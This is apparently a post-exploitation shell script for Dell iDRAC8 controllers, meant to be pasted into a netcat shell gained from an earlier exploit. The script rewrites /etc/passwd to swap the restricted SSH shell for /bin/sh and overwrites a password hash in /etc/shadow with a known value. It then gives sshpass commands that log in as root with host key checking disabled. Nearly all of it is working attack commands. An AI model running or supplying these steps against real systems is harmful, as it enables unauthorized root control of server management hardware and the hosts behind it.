#!/usr/bin/env sh
# idrac_shell_setup.sh — run these commands INSIDE the initial netcat shell
#
# The netcat shell from the exploit is noisy and limited (commands like
# writecfg fail in it). This upgrades to a proper SSH root session.
#
# HOW TO USE:
#   1. After the netcat shell appears, paste these commands one block at a time.
#   2. Then open a new terminal and SSH in (see bottom of this file).
#
# CONTEXT: running on iDRAC8 SH4 Linux (not the host OS).
#   /etc is read-only (squashfs) but we overwrite via /tmp redirection trick.
#   Changes are volatile — lost on iDRAC reboot.

# ---- Step A: redirect clpd (iDRAC SSH shell) to /bin/sh ----
cd /tmp
sed 's/\/usr\/bin\/clpd/\/bin\/sh/g' < /etc/passwd > /tmp/passwd_new
cat /tmp/passwd_new > /etc/passwd

# ---- Step B: set a known su password ----
# This sets the 'su' password to a known value
ORIG_HASH='\$1\$REDACTED_ORIG_HASH'
NEW_HASH='\$1\$REDACTED_NEW_HASH'
sed "s/${ORIG_HASH}/${NEW_HASH}/g" < /etc/shadow > /tmp/shadow_new
cat /tmp/shadow_new > /etc/shadow

# ---- Verify ----
grep root /etc/passwd   # should show /bin/sh at the end
echo "Setup done. Now SSH in from the host:"
echo "  sshpass -p <PASSWORD> ssh -o PreferredAuthentications=password root@192.168.1.100"
echo "  then run: su   (password: <LOCAL_PW>)"

# ---- From a NEW terminal on the host: ----
#   sshpass -p <PASSWORD> ssh -o StrictHostKeyChecking=no \
#     -o PreferredAuthentications=password root@192.168.1.100
#
#   (at the prompt, type):   su
#   (password):               <LOCAL_PW>
#
#   You now have a root sh shell on the iDRAC Linux OS.
#   Proceed with writecfg_patch.sh.
